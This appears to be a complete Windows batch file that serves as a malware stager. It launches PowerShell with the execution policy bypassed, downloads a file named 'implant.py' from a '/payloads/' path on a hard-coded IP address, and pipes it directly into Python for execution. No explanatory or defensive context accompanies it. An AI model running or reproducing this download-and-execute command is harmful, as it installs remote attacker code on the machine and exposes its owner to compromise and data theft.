@echo off
powershell -ExecutionPolicy Bypass -Command "& { $wc=New-Object System.Net.WebClient; $wc.DownloadString(https://172.24.1.83:443/payloads/implant.py') | python - }"
